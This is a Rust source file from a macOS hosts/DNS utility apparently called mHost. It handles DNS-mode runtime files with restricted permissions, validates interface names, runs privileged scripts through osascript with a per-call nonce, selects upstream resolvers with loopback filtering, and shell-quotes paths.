use std::net::{IpAddr, SocketAddr};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

use mhost_core::OriginalDns;

// ---------------------------------------------------------------------------
// Runtime directory + signal/state file paths
// ---------------------------------------------------------------------------
//
// **fix (H1, issue #90)**: 把 DNS mode 的临时文件从 world-writable 的
// /tmp 迁移到用户私有目录 `~/Library/Application Support/mHost/.runtime/`，
// 并全部设 mode 0o600。/tmp 下的旧文件在 cleanup_stale_proxy 启动时一次
// 性清理（向后兼容老版本升级）。
//
// 这些路径之前是 `const &str`，改成 `fn` 因为：
//   1. runtime_dir 依赖环境（`dirs::data_dir()` 或 `$MHOST_RUNTIME_DIR`），
//      无法在 const 上下文计算。
//   2. 测试可设 `MHOST_RUNTIME_DIR=/tmp/mhost-test-xxx` 隔离，不用担心
//      污染用户的真实 runtime 目录。

/// mhost DNS mode runtime 目录路径。
///
/// 默认 `~/Library/Application Support/mHost/.runtime/` (macOS)。
/// 测试可通过 `MHOST_RUNTIME_DIR` 环境变量覆盖到 tempdir。
pub fn runtime_dir() -> PathBuf {
    if let Ok(p) = std::env::var("MHOST_RUNTIME_DIR") {
        return PathBuf::from(p);
    }
    let base = dirs::data_dir()
        .or_else(dirs::home_dir)
        .unwrap_or_else(|| PathBuf::from("/tmp"));
    base.join("mHost").join(".runtime")
}

/// 确保 runtime dir 存在，权限 0o700（owner only）。
pub fn ensure_runtime_dir() -> std::io::Result<PathBuf> {
    use std::os::unix::fs::PermissionsExt;
    let dir = runtime_dir();
    if !dir.exists() {
        std::fs::create_dir_all(&dir)?;
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(dir)
}

/// DNS proxy PID 文件路径。mode 0o600（root 创建）。
pub fn proxy_pid_file() -> PathBuf {
    runtime_dir().join("mhost-dns-proxy.pid")
}

/// 启用 DNS 模式前的原始 DNS（mhost 写入，proxy 读取用于退出恢复）。
/// mode 0o600（owner only）。
pub fn original_dns_file() -> PathBuf {
    runtime_dir().join("mhost-dns-original.txt")
}

/// Proxy 关闭信号文件：mhost 写入 "shutdown"，proxy 轮询检测后做清理退出。
/// mode 0o600（owner only）—— proxy 是 root 启动的，mhost 是用户态，但
/// 两者都用同一 uid 运行（mhost 通过 osascript 提权起 proxy）。如果
/// proxy 不是 root 启动，shutdown 写不进去是更安全的行为（外部攻击者
/// 即使有 /tmp 写权限也无法触发）。
pub fn shutdown_signal_file() -> PathBuf {
    runtime_dir().join("mhost-dns-shutdown.signal")
}

/// Disable 路径的恢复标记：proxy 5s 内没退出 → 下次启动 mhost 会看到
/// 这个标记并强制走 `force_dns_restore_if_needed` 兜底（写 Empty 给活跃
/// 接口）。仅在确实出现 5s 超时时保留，正常路径会清理掉。
/// mode 0o600。
pub fn disable_recovery_marker_file() -> PathBuf {
    runtime_dir().join("mhost-dns-disable-recovery.marker")
}

/// 临时脚本名前缀（用于 osascript 提权）。
const TEMP_SCRIPT_PREFIX: &str = "mhost-dns-";

/// 等 proxy 退出的最大时长。
const PROXY_SHUTDOWN_TIMEOUT_SECS: u64 = 5;

/// 一次性的「老 /tmp 路径清理」：升级用户从老版本迁移过来时，
/// 旧路径下的文件不再被读写，会成为孤儿（其他用户可见，可能含 DNS 信息）。
/// 在 cleanup_stale_proxy 启动时删一下。
pub(crate) fn cleanup_legacy_tmp_files() {
    const LEGACY_PATHS: &[&str] = &[
        "/tmp/mhost-dns-proxy.pid",
        "/tmp/mhost-dns-original.txt",
        "/tmp/mhost-dns-shutdown.signal",
        "/tmp/mhost-dns-disable-recovery.marker",
    ];
    for path in LEGACY_PATHS {
        // 忽略错误（旧版本可能没创建过这些文件）
        let _ = std::fs::remove_file(path);
    }
}

/// 平台操作错误。
#[derive(Debug, thiserror::Error)]
pub enum PlatformError {
    #[error("failed to get system DNS: {0}")]
    GetDns(String),
    #[error("failed to set system DNS: {0}")]
    SetDns(String),
    #[error("failed to restore system DNS: {0}")]
    RestoreDns(String),
    #[error("failed to detect active network interface: {0}")]
    DetectInterface(String),
    #[error("invalid interface name: {0}")]
    InvalidInterfaceName(String),
    #[error("failed to write temp script: {0}")]
    TempScript(String),
    #[error("interface name is empty")]
    EmptyInterfaceName,
}

/// 接口名白名单：只允许字母、数字、空格、点、下划线、连字符、斜杠。
/// 这是 macOS 系统接口名常见字符集（如 "USB 10/100/1000 LAN"、"Wi-Fi"）。
/// 仍拒绝任何 shell 元字符（` ` $ \ & ; | < > ( ) { } [ ] ! ' " ` ? * ~ # % = : 等）。
fn is_valid_interface_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == ' ' || c == '.' || c == '_' || c == '-' || c == '/'
}

/// 验证接口名是否在白名单内。空字符串直接拒绝。
/// **fix（proxy self-cleanup）**：proxy 调 networksetup 时也要校验，
/// 所以改 pub 让 proxy 复用。
pub fn validate_interface_name(name: &str) -> Result<(), PlatformError> {
    if name.is_empty() {
        return Err(PlatformError::EmptyInterfaceName);
    }
    if !name.chars().all(is_valid_interface_char) {
        return Err(PlatformError::InvalidInterfaceName(format!(
            "name contains disallowed characters: {:?}",
            name
        )));
    }
    Ok(())
}

/// 生成下一个临时脚本的 PathBuf。文件名带递增后缀，避免 race。
fn next_temp_script_path() -> Result<PathBuf, PlatformError> {
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let n = COUNTER.fetch_add(1, Ordering::Relaxed);
    let name = format!("{}{}-{}.sh", TEMP_SCRIPT_PREFIX, std::process::id(), n);
    Ok(std::env::temp_dir().join(name))
}

/// 把 shell 脚本写到临时文件并设置 0o700，返回文件路径。
fn write_temp_script(content: &str) -> Result<PathBuf, PlatformError> {
    use std::os::unix::fs::OpenOptionsExt;
    let path = next_temp_script_path()?;
    let file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o700)
        .open(&path)
        .map_err(|e| PlatformError::TempScript(format!("create {:?}: {}", path, e)))?;
    use std::io::Write;
    let mut writer = std::io::BufWriter::new(file);
    writer
        .write_all(content.as_bytes())
        .map_err(|e| PlatformError::TempScript(format!("write {:?}: {}", path, e)))?;
    writer
        .flush()
        .map_err(|e| PlatformError::TempScript(format!("flush {:?}: {}", path, e)))?;
    Ok(path)
}

/// 使用 osascript 提权执行 shell 脚本。
///
/// **安全设计**：把脚本内容写到临时文件（0o700），osascript 只接收**文件路径**，
/// 路径通过 AppleScript 的 `quoted form of` 转义。任何 shell 元字符都进不到
/// 拼接的 AppleScript 字符串里。
fn run_with_privileges(script_body: &str) -> Result<std::process::Output, String> {
    let path = write_temp_script(script_body).map_err(|e| format!("temp script failed: {}", e))?;
    // 失败时清理临时文件
    let result = invoke_osascript(&path);
    let _ = std::fs::remove_file(&path);
    result
}

/// 调 osascript 让它以管理员权限执行临时脚本。脚本路径已写盘，
/// 字符串拼接只发生在 AppleScript 字面量内，并用 `quoted form of POSIX path of`
/// 走 AppleScript 自身的转义机制，不依赖手工 shell escape。
///
/// **fix (issue follow-up: force TCC re-prompt every time)**：复用
/// `build_osascript_command` 注入 nonce,让 macOS TCC 5min 缓存不命中,
/// disable / recovery 路径也每次重新弹授权框（与 `spawn_osascript` 一致）。
fn invoke_osascript(path: &std::path::Path) -> Result<std::process::Output, String> {
    let path_str = path.to_string_lossy();
    let nonce = generate_nonce();
    let apple_script = build_osascript_command(&path_str, &nonce);
    tracing::debug!(
        "invoke_osascript: nonce={}, script_path={}",
        nonce,
        path_str
    );
    Command::new("osascript")
        .args(["-e", &apple_script])
        .output()
        .map_err(|e| format!("osascript failed: {}", e))
}

/// **fix (issue #142 follow-up)**：Result of an osascript invocation that
/// exposes the child PID so the caller can kill it on timeout — the
/// previous `Command::output()` wrapper hid the PID. macOS-only because
/// the osascript call site itself is macOS-only.
///
/// **TODO (#149/#155 follow-up)**：当前 `commands/dns.rs` 还在用
/// `tokio::time::timeout + spawn_blocking`（fix #142 的 60s timeout 路径），
/// 会 leak osascript 子进程（timeout fire 时 blocking thread 不取消）。
/// 后续 Group 4/#149 PR 会改用 `run_with_privileges_timeout` 同步调用，
/// 届时这些 helper 会被实际使用 → 移除这个 `allow(dead_code)`。
#[cfg(target_os = "macos")]
#[allow(dead_code)] // see TODO above — used by future PR, not by current call site
pub(crate) struct OsascriptRun {
    pub child: std::process::Child,
    pub pid: i32,
}

/// Build the AppleScript that `osascript -e` will execute. Pure function
/// (no I/O, no spawning) so it's directly unit-testable.
///
/// **fix (issue follow-up: force TCC re-prompt every time)**：每次调用
/// 都注入一个唯一 nonce 到 elevated shell 命令里（作为 shell 注释
/// `#nonce<value>`）。macOS TCC 的 authorization cache key 基于实际
/// 被提权的命令字符串 —— nonce 不同 → cache key 不同 → TCC 必须重新弹
/// 授权框而不是静默放行（5min 缓存窗口失效）。
///
/// 注释形式 `#nonce<value>` 保证 nonce 不影响脚本执行（shell 注释），但
/// 仍能让 macOS TCC 看到不同的命令字符串。
///
/// Path escaping：AppleScript 字符串里 `\` 和 `"` 需要分别转义为 `\\`
/// 和 `\"`（AppleScript 的 escape 规则）。
#[cfg(target_os = "macos")]
pub(crate) fn build_osascript_command(script_path: &str, nonce: &str) -> String {
    let escaped_path = script_path.replace('\\', "\\\\").replace('"', "\\\"");
    format!(
        "do shell script \"sh \" & quoted form of POSIX path of \"{}\" \
         & \" #nonce{}\" with administrator privileges",
        escaped_path, nonce
    )
}

/// Generate a unique nonce for one osascript invocation. Uses nanosecond
/// timestamp + PID + monotonic counter so even rapid-fire calls (same
/// nanosecond, same process) yield distinct values.
///
/// Format: `<nanos_hex>-<pid>-<counter>` —— 紧凑、易读、跨进程+进程内唯一。
#[cfg(target_os = "macos")]
fn generate_nonce() -> String {
    use std::sync::atomic::Ordering;
    use std::time::{SystemTime, UNIX_EPOCH};
    static COUNTER: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let pid = std::process::id();
    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
    format!("{:x}-{}-{}", nanos, pid, counter)
}

/// Spawn osascript and return the running `Child` so the caller can kill
/// it on timeout. Replaces the previous fire-and-forget `.output()` call.
///
/// Stdio pipes are set explicitly (`Stdio::piped()`) so the Rust side
/// owns valid pipes; without them `wait_with_output` would fail.
///
/// **fix (issue follow-up: force TCC re-prompt every time)**：每次 spawn
/// 都通过 `generate_nonce()` 注入一个唯一 nonce 到 AppleScript 命令，
/// 让 macOS TCC 不会用 5min 缓存静默放行。详见 `build_osascript_command`。
///
/// **TODO (#149/#155 follow-up)**：当前 callsite 还没切过来，保留供未来 PR。
#[cfg(target_os = "macos")]
#[allow(dead_code)] // see TODO above — used by future PR, not by current call site
pub(crate) fn spawn_osascript(path: &std::path::Path) -> Result<OsascriptRun, String> {
    let nonce = generate_nonce();
    let path_str = path.to_string_lossy();
    let apple_script = build_osascript_command(&path_str, &nonce);
    tracing::debug!("spawn_osascript: nonce={}, script_path={}", nonce, path_str);
    let child = Command::new("osascript")
        .args(["-e", &apple_script])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| format!("osascript spawn failed: {}", e))?;
    let pid = child.id() as i32;
    Ok(OsascriptRun { child, pid })
}

/// Best-effort SIGKILL the osascript child. The goal is to unblock the
/// Rust-side wait so the UI can recover; the kill itself is fire-and-forget.
///
/// **TODO (#149/#155 follow-up)**：当前 callsite 还没切过来，保留供未来 PR。
#[cfg(target_os = "macos")]
#[allow(dead_code)] // see TODO above — used by future PR, not by current call site
pub(crate) fn kill_osascript(pid: i32) {
    // SAFETY: `kill(2)` with a valid PID is safe; the PID comes from the
    // Child we just spawned and we hold the Child handle.
    unsafe {
        libc::kill(pid as libc::pid_t, libc::SIGKILL);
    }
}

/// Run osascript with a hard wall-clock timeout. On timeout, SIGKILL the
/// child and return `Err` so the caller surfaces a clear error to the UI.
///
/// Synchronous (not `tokio::time::timeout` + `spawn_blocking`) on purpose:
/// the v0.3.3 attempt used that pattern and was removed because dropping
/// the `JoinHandle` after timeout doesn't interrupt the blocking thread,
/// which leaks osascript and leaves `dns_enabled=false` in-memory while
/// the proxy is already running + system DNS is already flipped
/// (state desync). Here we hold the `Child` directly and SIGKILL on
/// expiry, so the child is reaped on every exit path.
///
/// **TODO (#149/#155 follow-up)**：当前 `commands/dns.rs` 还在用
/// `tokio::time::timeout + spawn_blocking`（leaky 60s timeout 路径）。
/// 后续 Group 4 / #149 PR 会把这个 helper 接到 `enable_dns_mode` 的
/// osascript 调用点，取代 leaky timeout wrapper → 移除 `allow(dead_code)`。
#[cfg(target_os = "macos")]
#[allow(dead_code)] // see TODO above — used by future PR, not by current call site
pub(crate) fn run_with_privileges_timeout(
    script_body: &str,
    timeout: std::time::Duration,
) -> Result<std::process::Output, String> {
    let path = write_temp_script(script_body).map_err(|e| format!("temp script failed: {}", e))?;
    let mut run = match spawn_osascript(&path) {
        Ok(r) => r,
        Err(e) => {
            // spawn failed; safe to remove (osascript never started).
            let _ = std::fs::remove_file(&path);
            return Err(e);
        }
    };

    let start = std::time::Instant::now();
    // **Critical (issue found 2026-08-07)**: do NOT remove the temp script
    // file until AFTER osascript has exited. osascript spawns `sh <path>`
    // lazily from the AppleScript engine — if we delete the file before
    // that exec, sh gets ENOENT (exit 127) and osascript returns exit 256
    // with no error dialog visible to the user. This was the cause of
    // the "no prompt, no error, UI stuck" hang.
    let outcome: Result<std::process::Output, String> = loop {
        match run.child.try_wait() {
            Ok(Some(_status)) => {
                break run
                    .child
                    .wait_with_output()
                    .map_err(|e| format!("osascript wait_with_output failed: {}", e));
            }
            Ok(None) => {
                if start.elapsed() >= timeout {
                    kill_osascript(run.pid);
                    // Reap the zombie, don't block forever.
                    let _ = run.child.wait();
                    break Err(format!(
                        "osascript timed out after {:?} (killed pid={}); \
                         the TCC prompt may be stuck — try again or \
                         force-quit System Events",
                        timeout, run.pid
                    ));
                }
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
            Err(e) => break Err(format!("osascript try_wait failed: {}", e)),
        }
    };

    // SAFE TO REMOVE NOW: osascript has exited and won't exec sh again.
    let _ = std::fs::remove_file(&path);
    outcome
}
/// **fix（disabling-after-network-switch）**：capture the user's original DNS
/// configuration **type**, separating "user managed" from "DHCP/empty".
///
/// Rules:
/// 1. `networksetup -getdnsservers <port>`  returns non-empty
///    → `Manual(list)` — user explicitly configured DNS in System Settings.
/// 2. Tier 1 empty (DHCP-pushed but user hasn't confirmed in System Settings,
///    or true empty / air-gapped) → `DhcpEmpty`.
///
/// Tier 3 (the public `[8.8.8.8, 1.1.1.1]` resolver fallback) is **never**
/// returned here — it's not a "user state", it's a fallback for the resolver
/// upstream. See `get_upstream_resolvers` for that purpose.
pub fn capture_dns_state() -> Result<OriginalDns, PlatformError> {
    let port = get_active_network_interface()?;

    // Tier 1: 用户在 System Settings 里手动配的 DNS。
    if let Ok(servers) = networksetup_get_dns(&port) {
        if !servers.is_empty() {
            return Ok(OriginalDns::Manual(servers));
        }
    }

    // Tier 1 空：用户没手动配（系统用 DHCP 默认或真没 DNS）。
    // Tier 2 的具体 IP 值不写进 snapshot —— 不替用户决定配置。
    Ok(OriginalDns::DhcpEmpty)
}

/// 获取当前系统上游 DNS resolver 列表（Tlier 1 → Tier 2 → 公共 fallback）。
///
/// 用作 `DnsServer.upstream` 的初始值（以及 mid-session 刷新目标），
/// **不**用来决定 restore target（restore 用 `OriginalDns`，见
/// `OriginalDns::restore_argv`）。
///
/// Tier 3 兜底 `[8.8.8.8, 1.1.1.1]` 是上游 resolver 的最后一道防线，
/// 绝不是「用户原本的状态」——调用方 get_upstream_resolvers 的调用者应
/// 在返回为 Tier 3 时打 warning log。
///
/// 上游 DNS 的来源。`get_upstream_resolvers()` 返回此 enum 让上层能
/// 区分「用户配的 / DHCP 推的 / 公共 fallback」三种情况（例如打 warning）。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum UpstreamTier {
    /// Tier 1：`networksetup -getdnsservers` —— 用户在 System Settings
    /// 里手动配的 DNS。
    Networksetup,
    /// Tier 2：`ipconfig getoption <device> domain_name_server` ——
    /// DHCP 推的 DNS。
    Ipconfig,
    /// Tier 3：Tier 1 / Tier 2 都拿不到结果时的公共 fallback。
    Public,
}

/// **fix (issue #103)**：Tier 1 / Tier 2 拿到结果后会过滤掉本机 loopback /
/// unspecified 地址。DNS 模式启用后系统 DNS 被改成 `127.0.0.1`
///（见 `enable_dns_mode`），不剔除会导致 `run_upstream_refresh_loop`
/// 把 upstream hot-swap 成 `[127.0.0.1]`，DNS 服务器开始向自己递归
/// 转发，切换 WiFi 后也永远拿不到新网络的 DHCP DNS。
///
/// **fix issue #103 (debug follow-up)**：每个 tier 命中的瞬间都打
/// `tracing::debug!`，包括 Tier 1 / Tier 2 过滤前后的差异。配合
/// `RUST_LOG=mhost_dns=debug` 即可看到：
///   - networksetup / ipconfig 实际返回什么
///   - 哪些条目被 `is_local_resolver` 过滤掉
///   - 最终选中的 tier 是哪一个
///
/// 同时返回 `UpstreamTier`，调用方可以根据 source 区分「用户配置的
/// upstream」和「公共 DNS fallback」，避免对恰好等于 fallback 列表的
/// 合法配置（如用户在 System Settings 里手编 `[8.8.8.8, 1.1.1.1]`）
/// 误报"没拿到系统 DNS"。
pub fn get_upstream_resolvers() -> (Vec<String>, UpstreamTier) {
    let port = match get_active_network_interface() {
        Ok(p) => {
            tracing::debug!("get_upstream_resolvers: active interface port = {:?}", p);
            p
        }
        Err(e) => {
            tracing::debug!(
                "get_upstream_resolvers: get_active_network_interface failed ({}), falling back to Tier 3",
                e
            );
            return (tier3_fallback(), UpstreamTier::Public);
        }
    };

    let tier1 = networksetup_get_dns(&port).unwrap_or_default();
    if !tier1.is_empty() {
        tracing::debug!(
            "get_upstream_resolvers: Tier 1 (networksetup -getdnsservers {:?}) raw = {:?}",
            port,
            tier1
        );
    } else {
        tracing::debug!("get_upstream_resolvers: Tier 1 (networksetup) empty/failed");
    }

    let tier2 = get_active_network_device()
        .as_deref()
        .and_then(|dev| {
            tracing::debug!(
                "get_upstream_resolvers: Tier 2 querying ipconfig on device {:?}",
                dev
            );
            ipconfig_get_dns(dev).ok()
        })
        .unwrap_or_default();
    if !tier2.is_empty() {
        tracing::debug!("get_upstream_resolvers: Tier 2 (ipconfig) = {:?}", tier2);
    } else {
        tracing::debug!("get_upstream_resolvers: Tier 2 (ipconfig) empty/failed");
    }

    let (result, source) = select_upstream(tier1, tier2);
    tracing::debug!(
        "get_upstream_resolvers: selected tier={:?} result={:?}",
        source,
        result
    );
    (result, source)
}

/// 给定 Tier 1 / Tier 2 原始结果，挑出该用的 upstream 并报告来源。
///
/// 规则：
/// 1. Tier 1 过滤 loopback 后非空 → 用 Tier 1（用户意图优先）
/// 2. Tier 2 过滤 loopback 后非空 → 用 Tier 2（DHCP-pushed）
/// 3. 两者都空 → Tier 3 公共 fallback
///
/// **fix (issue #103)**：loopback 过滤对 Tier 1 / Tier 2 都应用（不仅
/// Tier 1），保证不会因为 `ipconfig getoption` 偶尔返回 `127.0.0.1`
/// 而把 self-loop 写回 upstream。
///
/// 这个函数是纯函数，方便单测；`get_upstream_resolvers()` 只是
/// shell 调用 + 调它的薄壳。
pub fn select_upstream(tier1: Vec<String>, tier2: Vec<String>) -> (Vec<String>, UpstreamTier) {
    let tier1_filtered: Vec<String> = tier1
        .into_iter()
        .filter(|s| !is_local_resolver(s))
        .collect();
    if !tier1_filtered.is_empty() {
        return (tier1_filtered, UpstreamTier::Networksetup);
    }
    let tier2_filtered: Vec<String> = tier2
        .into_iter()
        .filter(|s| !is_local_resolver(s))
        .collect();
    if !tier2_filtered.is_empty() {
        return (tier2_filtered, UpstreamTier::Ipconfig);
    }
    (tier3_fallback(), UpstreamTier::Public)
}

/// **fix (issue #103)**：判断一个 resolver 字符串是否是「指向本机」的
/// 地址（即不应该被当成 upstream）。覆盖：
///
/// - IPv4 loopback（`127.0.0.0/8`，不仅是 `127.0.0.1`）
/// - IPv6 loopback（`::1`）
/// - IPv4 / IPv6 unspecified（`0.0.0.0` / `::`）
///
/// 同时容忍 `host:port` 和 `[host]:port`（v6 bracketed）形式；如果
/// 解析不出来（畸形字符串），按「非本地」处理，保留给上层常规校验
/// 兜底（参见 `proxy.rs::validate_dns_entries`）。
fn is_local_resolver(server: &str) -> bool {
    let host = server
        .parse::<SocketAddr>()
        .map(|sa| sa.ip())
        .or_else(|_| server.parse::<IpAddr>());
    matches!(host, Ok(ip) if ip.is_loopback() || ip.is_unspecified())
}

/// Tier 3 fallback list. Public so tests can compare against it.
pub fn tier3_fallback() -> Vec<String> {
    vec!["8.8.8.8".to_string(), "1.1.1.1".to_string()]
}

/// `networksetup -getdnsservers <port>` —— 用户在 System Settings 里
/// 手动配的 DNS。返回空 vec 表示「没手动配」（常见于纯 DHCP 场景）。
fn networksetup_get_dns(port: &str) -> Result<Vec<String>, PlatformError> {
    let output = Command::new("networksetup")
        .args(["-getdnsservers", port])
        .output()
        .map_err(|e| PlatformError::GetDns(format!("networksetup command failed: {}", e)))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::GetDns(format!(
            "networksetup failed: {}",
            stderr
        )));
    }
    let raw = parse_dns_servers(&String::from_utf8_lossy(&output.stdout))?;
    // **fix (issue #152, root cause 2)**: `127.0.0.1` / `::1` are
    // mHost's own proxy address injected by `enable_dns_mode`. If they
    // are read back via `capture_dns_state` (e.g., enable → partial-fail
    // disable → re-enable before marker recovery), they get persisted
    // to `mhost-dns-original.txt` and `manifest.original_dns` as the
    // "user's original DNS", which silently corrupts future restores.
    //
    // `is_local_resolver` is already used by `get_upstream_resolvers`
    // (issue #103 fix) for the same reason. Reuse here.
    let filtered: Vec<String> = raw.into_iter().filter(|s| !is_local_resolver(s)).collect();
    Ok(filtered)
}

/// `ipconfig getoption <device> domain_name_server` —— DHCP 推的 DNS。
/// 每行一个 IP（legacy 版本可能空格分隔），由 `parse_dns_servers` 统一解析。
fn ipconfig_get_dns(device: &str) -> Result<Vec<String>, PlatformError> {
    let output = Command::new("ipconfig")
        .args(["getoption", device, "domain_name_server"])
        .output()
        .map_err(|e| PlatformError::GetDns(format!("ipconfig failed: {}", e)))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::GetDns(format!(
            "ipconfig failed: {}",
            stderr
        )));
    }
    parse_dns_servers(&String::from_utf8_lossy(&output.stdout))
}

/// 默认路由对应的 BSD 设备名（如 `en0`），供 ipconfig 使用。
/// 失败返回 None（get_system_dns 走 Tier 3 兜底）。
fn get_active_network_device() -> Option<String> {
    let output = Command::new("route")
        .args(["-n", "get", "default"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    parse_route_interface(&stdout)
}

/// 在 macOS 上启用 DNS 模式：
///   1. mhost 把 original DNS 写到 `$RUNTIME_DIR/mhost-dns-original.txt`
///      （用户态写自己私有目录，不需要 root）
///   2. mhost 创建 `$RUNTIME_DIR/mhost-dns-shutdown.signal`，content="running"，
///      mode=0o600（owner only；proxy 是同 uid 提权启动，能写）
///   3. osascript 提权跑脚本：起 proxy + 改系统 DNS = 127.0.0.1
///
/// **fix（proxy self-cleanup）**：把 original DNS 和 signal file 提前
/// 写到 runtime dir（不需要 root），让 proxy 在退出时能自己读 original +
/// 检测 signal 文件，**不需要再走 osascript 弹 sudo 框**。
///
/// **fix（H1, issue #90）**：从 /tmp 迁移到 ~/Library/Application Support/mHost/.runtime/，
/// mode 从 0o666 改 0o600。/tmp 旧路径在 cleanup_stale_proxy 启动时清理。
///
/// **fix（issue #155 + PR #156 review）**：
///   - pre-check proxy binary 存在且可执行（Rust side，return Err）
///   - 提权脚本用 `[ -x ]` 二次校验 + `kill -0` post-launch 探测
///   - 所有 path 走单引号包裹（POSIX shell-quoting idiom），保证
///     `~/Library/Application Support/...` 这种带空格路径不会截断
///   - `trap ... EXIT` 在 networksetup 成功前清掉 disowned proxy + PID 文件
pub fn enable_dns_mode(dns_port: u16, original: &OriginalDns) -> Result<(), PlatformError> {
    let interface = get_active_network_interface()?;
    validate_interface_name(&interface)?;

    // 0.5 **fix（issue #155）**：先验证 `mhost-dns-proxy` sidecar binary
    //     存在并且可执行，再做任何文件写入 / 网络副作用。
    let proxy_path = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|dir| dir.join("mhost-dns-proxy")))
        .unwrap_or_else(|| PathBuf::from("mhost-dns-proxy"));
    validate_proxy_binary(&proxy_path)?;

    // 1. 确保 runtime dir 存在（mode 0o700）
    ensure_runtime_dir()
        .map_err(|e| PlatformError::SetDns(format!("create runtime dir: {}", e)))?;

    // 2. 写 original DNS 文件 + signal 文件（同 issue #155 老逻辑）
    //
    // **fix (issue #152 hardening)**：写盘前最后再过滤一次 loopback。
    // 上游 `capture_dns_state` 已经过滤；这里多一道是 belt-and-suspenders，
    // 防止未来新增的 capture 路径忘了过滤把 127.0.0.1 写进 original.txt。
    let original_path = original_dns_file();
    if let OriginalDns::Manual(servers) = original {
        let filtered: Vec<String> = servers
            .iter()
            .filter(|s| !is_local_resolver(s))
            .cloned()
            .collect();
        if filtered.is_empty() {
            // 过滤后变空（极端情况：用户原本的 Manual 只有 loopback）→
            // 视为 DhcpEmpty，不写文件。
            let _ = std::fs::remove_file(&original_path);
        } else {
            let original_content = filtered.join("\n");
            write_atomic_0600(&original_path, original_content.as_bytes())
                .map_err(|e| PlatformError::SetDns(format!("write original dns file: {}", e)))?;
        }
    } else {
        let _ = std::fs::remove_file(&original_path);
    }
    write_signal_file(&shutdown_signal_file(), "running")
        .map_err(|e| PlatformError::SetDns(format!("write shutdown signal file: {}", e)))?;

    // 3. 构造并执行脚本。脚本体在 `build_enable_script` 里（pub(crate)
    //    暴露给 tests，免得测试再 format! 一份独立脚本造成回归盲区）。
    let pid_file = proxy_pid_file();
    let log_path = ensure_runtime_dir()
        .map_err(|e| PlatformError::SetDns(format!("create runtime dir for log: {}", e)))?
        .join("mhost-dns-proxy.log");
    let inputs = EnableScriptInputs {
        proxy_path: &proxy_path,
        dns_port,
        pid_file: &pid_file,
        log_path: &log_path,
        interface: &interface,
    };
    let script_body = build_enable_script(&inputs);

    let output = run_with_privileges(&script_body)
        .map_err(|e| PlatformError::SetDns(format!("enable dns mode failed: {}", e)))?;
    if !output.status.success() {
        let _ = std::fs::remove_file(&original_path);
        let _ = std::fs::remove_file(shutdown_signal_file());
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::SetDns(format!(
            "proxy failed to start: {}",
            stderr
        )));
    }
    Ok(())
}

/// 验证 `mhost-dns-proxy` sidecar binary 存在且可执行。
///
/// **fix（issue #155）**：从 `enable_dns_mode` 抽出供测试直接调用，
/// 否则测试会再 format! 一份独立脚本 → 真实代码改坏了测试还过。
pub(crate) fn validate_proxy_binary(proxy_path: &Path) -> Result<(), PlatformError> {
    let display = proxy_path.display().to_string();
    match std::fs::metadata(proxy_path) {
        Ok(meta) => {
            use std::os::unix::fs::PermissionsExt;
            if meta.permissions().mode() & 0o111 == 0 {
                return Err(PlatformError::SetDns(format!(
                    "mhost-dns-proxy at {display} is not executable; \
                     rebuild with `{PROXY_BUILD_INSTR}`",
                )));
            }
        }
        Err(e) => {
            return Err(PlatformError::SetDns(format!(
                "mhost-dns-proxy binary not found at {display} ({e}). \
                 This usually means `pnpm tauri dev` was run without first building the proxy. \
                 Fix: `{PROXY_BUILD_INSTR}`, \
                 or use `bash scripts/dev.sh` which builds it for you. \
                 See doc/dev-guide.md for details.",
            )));
        }
    }
    Ok(())
}

/// 用户告诉用户「重建」时该敲的精确命令（含 `-p mhost-dns`，因为
/// workspace root 不识别跨 crate [[bin]]）。
///
/// **fix（F5, PR #156 review）**：之前各文档里散落的
/// `cargo build --bin mhost-dns-proxy` 在 workspace root 会 fail 报
/// "no bin target named 'mhost-dns-proxy' in default-run packages"，
/// 把用户从「silent failure」摆渡到「更难修的 explicit failure」。
/// 把命令集中在这里，所有错误消息 + 文档都引用它。
pub(crate) const PROXY_BUILD_INSTR: &str =
    "cd src-tauri && cargo build -p mhost-dns --bin mhost-dns-proxy";

/// 输入参数让 `build_enable_script` 拼出提权脚本。
///
/// **fix（F1 + F2, PR #156 review）**：从 `enable_dns_mode` 抽出，
/// 让测试直接调用生产 builder 而不是 format! 一份独立脚本（防止
/// 「脚本结构变了测试还能过」的回归盲区）。同时结构化输入避免
/// 函数签名膨胀。
#[derive(Debug)]
pub(crate) struct EnableScriptInputs<'a> {
    pub proxy_path: &'a Path,
    pub dns_port: u16,
    pub pid_file: &'a Path,
    pub log_path: &'a Path,
    pub interface: &'a str,
}

/// POSIX-shell 单引号包裹：把字符串裹在 `'…'` 里，内部每个
/// `'` 替换成 `'\''`（end-quote / escaped-quote / re-quote 三段）。
///
/// 用途（**fix F2, PR #156 review**）：把路径注入 shell 脚本时不能用
/// 字符串插值 —— `~/Library/Application Support/...` 这种带空格的
/// 路径在裸替换下会触发 word splitting，把 redirect `> {pid_file}`
/// 变成 `> ~/Library/Application` + `Support/...` 残留为 echo args。
/// `>` 这种 POSIX-shell 唯一安全的传递方式是单引号（任何字节都能传，
/// 没有变量展开、不受 metacharacter 影响）。
///
/// 测试：见 `test_shell_single_quote_*`。
pub(crate) fn shell_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            out.push_str(r"'\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

